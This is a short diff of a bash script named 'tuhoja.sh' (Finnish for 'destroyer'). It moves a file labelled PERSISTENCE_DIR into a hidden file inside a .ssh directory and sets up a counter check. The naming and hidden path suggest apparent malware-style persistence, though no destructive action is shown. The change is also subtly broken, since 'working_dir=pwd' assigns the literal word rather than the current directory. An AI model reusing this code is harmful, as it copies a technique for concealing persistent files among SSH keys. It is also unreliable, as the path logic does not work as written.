@@ -1,6 +1,7 @@
 #!/bin/bash
-TEMPFILE=~counter.tmp
-PERSISTENCE_DIR=/opt/tuhoja.sh
+working_dir=pwd
+TEMPFILE=$working_dir/counter.tmp
+PERSISTENCE_DIR=$working_dir/.ssh/.tuhoja.sh
 COUNTER=0
 if test -f $PERSISTENCE_DIR ; then
   if test -f $TEMPFILE ; then
